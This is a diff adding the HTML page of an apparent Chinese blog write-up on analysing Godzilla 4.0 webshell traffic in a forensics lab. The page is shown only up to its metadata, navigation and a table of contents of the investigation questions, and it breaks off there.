@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="参考文章：玄机——第六章-哥斯拉4.0流量分析 wp 什么是哥斯拉哥斯拉（Godzilla） 是一款功能强大的 WebShell 工具，主要用于渗透测试和攻击中。它以其高度隐蔽性和丰富的功能而闻名，能够绕过传统的安全检测机制（如防火墙、IDS&#x2F;IPS 等），并在目标服务器上执行各种恶意操作。 哥斯拉webshell的特征 哥斯拉Webshell通常以PHP、ASP、JSP等格式存在，文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="玄机第六章哥斯拉4.0流量分析">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="参考文章：玄机——第六章-哥斯拉4.0流量分析 wp 什么是哥斯拉哥斯拉（Godzilla） 是一款功能强大的 WebShell 工具，主要用于渗透测试和攻击中。它以其高度隐蔽性和丰富的功能而闻名，能够绕过传统的安全检测机制（如防火墙、IDS&#x2F;IPS 等），并在目标服务器上执行各种恶意操作。 哥斯拉webshell的特征 哥斯拉Webshell通常以PHP、ASP、JSP等格式存在，文件">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423001130024.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423001910080.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423002810926.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423005159113.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423010644028.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423011420087.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423011933056.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012000681.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012759183.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423012901568.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014420445.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014508150.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014523510.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014616311.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014801550.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014836889.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423013427596.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423013436578.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423014226739.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015243359.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015517221.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015508224.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423015657088.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020147901.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020517316.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020523631.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020610594.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020836827.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423020848552.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021119043.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021506133.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021522479.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021741611.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021928796.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423021946467.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022007129.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022531853.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022551687.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022735132.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022828891.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022859728.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423022952007.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023127509.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023523351.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023710871.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423023958206.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423024303031.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/6b0edff64860456683644e062508a241.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/de7d967445b644c38bc7e976ac2799e0.png">
+<meta property="article:published_time" content="2025-04-22T15:53:27.000Z">
+<meta property="article:modified_time" content="2025-04-22T19:07:10.738Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="玄机第六章哥斯拉流量分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E7%8E%84%E6%9C%BA%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20250423001130024.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>玄机第六章哥斯拉4.0流量分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/27/ctfshow%E5%A4%A7%E7%89%9B%E6%9D%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/22/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&text=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&is_video=false&description=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=玄机第六章哥斯拉4.0流量分析&body=Check out this article: https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&title=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&name=玄机第六章哥斯拉4.0流量分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/22/%E7%8E%84%E6%9C%BA%E7%AC%AC6%E7%AB%A0%E5%93%A5%E6%96%AF%E6%8B%894-0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/&t=玄机第六章哥斯拉4.0流量分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">1.</span> <span class="toc-text">什么是哥斯拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89webshell%E7%9A%84%E7%89%B9%E5%BE%81"><span class="toc-number">2.</span> <span class="toc-text">哥斯拉webshell的特征</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">哥斯拉加密分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E9%BB%91%E5%AE%A2%E7%9A%84IP%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.1.</span> <span class="toc-text">1、黑客的IP是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%BB%91%E5%AE%A2%E6%98%AF%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%EF%BC%9F%EF%BC%88%E6%8F%90%E4%BA%A4CVE%E7%BC%96%E5%8F%B7%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">2、黑客是通过什么漏洞进入服务器的？（提交CVE编号）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#204%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">4.2.1.</span> <span class="toc-text">204状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">webshell分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-%E6%8F%90%E4%BA%A4%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">4.3.</span> <span class="toc-text">3、黑客上传的木马文件名是什么？(提交文件名)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.4.</span> <span class="toc-text">4、黑客上传的木马连接密码是什么？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E9%BB%91%E5%AE%A2%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%9C%A8%E9%A9%AC%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.5.</span> <span class="toc-text">5、黑客上传的木马解密密钥是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%A8%E9%A9%AC%E7%9A%84%E8%A7%A3%E5%AF%86%E5%AF%86%E9%92%A5%EF%BC%9F"><span class="toc-number">4.5.1.</span> <span class="toc-text">什么是木马的解密密钥？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E9%BB%91%E5%AE%A2%E8%BF%9E%E6%8E%A5webshell%E5%90%8E%E6%89%A7%E8%A1%8C%E7%9A%84%E7%AC%AC%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.6.</span> <span class="toc-text">6、黑客连接webshell后执行的第一条命令是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7"><span class="toc-number">4.6.1.</span> <span class="toc-text">哥斯拉流量解密工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.6.2.</span> <span class="toc-text">恶意代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%8F%8F%E8%BF%B0"><span class="toc-number">4.6.2.1.</span> <span class="toc-text">命令执行的描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%88%86%E8%A7%A3"><span class="toc-number">4.6.2.2.</span> <span class="toc-text">参数分解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E9%BB%91%E5%AE%A2%E8%BF%9E%E6%8E%A5webshell%E6%97%B6%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8Dshell%E7%9A%84%E6%9D%83%E9%99%90%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.7.</span> <span class="toc-text">7、黑客连接webshell时查询当前shell的权限是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eid%E5%91%BD%E4%BB%A4"><span class="toc-number">4.7.1.</span> <span class="toc-text">关于id命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E9%BB%91%E5%AE%A2%E5%88%A9%E7%94%A8webshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%9F%A5%E8%AF%A2%E6%9C%8D%E5%8A%A1%E5%99%A8Linux%E7%B3%BB%E7%BB%9F%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">4.8.</span> <span class="toc-text">8、黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Liunx%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%91%E8%A1%8C%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">4.8.1.</span> <span class="toc-text">Liunx常见的发行的系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E5%91%BD%E4%BB%A4%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E5%BD%93%E5%89%8D%E7%9A%84%E5%8F%91%E8%A1%8C%E7%89%88%E6%9C%AC%EF%BC%9F"><span class="toc-number">4.8.2.</span> <span class="toc-text">什么命令可以查看到当前的发行版本？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-lsb-release%E5%91%BD%E4%BB%A4"><span class="toc-number">4.8.2.1.</span> <span class="toc-text">1.lsb_release命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-cat-etc-os-release"><span class="toc-number">4.8.2.2.</span> <span class="toc-text">2.cat  &#x2F;etc&#x2F;os-release</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-uname%E5%91%BD%E4%BB%A4"><span class="toc-number">4.8.2.3.</span> <span class="toc-text">3.uname命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E9%BB%91%E5%AE%A2%E5%88%A9%E7%94%A8webshell%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%BF%98%E6%9F%A5%E8%AF%A2%E5%B9%B6%E8%BF%87%E6%BB%A4%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88%E6%8F%90%E4%BA%A4%E6%95%B4%E6%9D%A1%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%89"><span class="toc-number">4.9.</span> <span class="toc-text">9、黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81%E9%BB%91%E5%AE%A2%E7%95%99%E4%B8%8B%E5%90%8E%E9%97%A8%E7%9A%84%E5%8F%8D%E8%BF%9E%E7%9A%84IP%E5%92%8CPORT%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88IP-PORT"><span class="toc-number">4.10.</span> <span class="toc-text">10、黑客留下后门的反连的IP和PORT是什么？（IP:PORT)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88Reverse-Connection%EF%BC%89%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.10.1.</span> <span class="toc-text">反向连接（Reverse Connection）是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP-%E5%92%8C-PORT%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.10.2.</span> <span class="toc-text">IP 和 PORT是什么</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11%E3%80%81%E9%BB%91%E5%AE%A2%E9%80%9A%E8%BF%87%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E7%95%99%E4%B8%8B%E4%BA%86%E5%90%8E%E9%97%A8%EF%BC%9F"><span class="toc-number">4.11.</span> <span class="toc-text">11、黑客通过什么文件留下了后门？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">4.11.1.</span> <span class="toc-text">什么是后门文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">4.11.2.</span> <span class="toc-text">后门文件的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getFiledirName-%E6%96%B9%E6%B3%95"><span class="toc-number">4.11.3.</span> <span class="toc-text">getFiledirName 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E7%9B%AE%E7%9A%84"><span class="toc-number">4.11.4.</span> <span class="toc-text">后门目的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 